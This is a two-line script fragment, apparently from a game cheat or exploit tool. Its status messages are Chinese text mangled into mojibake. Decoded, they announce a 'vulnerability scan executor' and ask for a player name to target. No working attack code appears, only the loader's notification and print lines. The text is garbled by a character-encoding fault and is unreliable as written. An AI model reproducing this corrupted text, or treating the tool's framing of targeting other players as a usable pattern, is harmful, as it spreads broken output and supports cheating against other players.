notify("é«˜çº§æ¼æ´æ‰«ææ‰§è¡Œå™¨ v4.1 å·²åŠ è½½\nåœ¨ç›®æ ‡å¯¹è±¡æ¡†ä¸­è¾“å…¥ç©å®¶åç§°ï¼Œè„šæœ¬ä¼šè‡ªåŠ¨æ›´æ–°")

print("é«˜çº§æ¼æ´æ‰«ææ‰§è¡Œå™¨ v4.1 - å·²åˆå§‹åŒ–")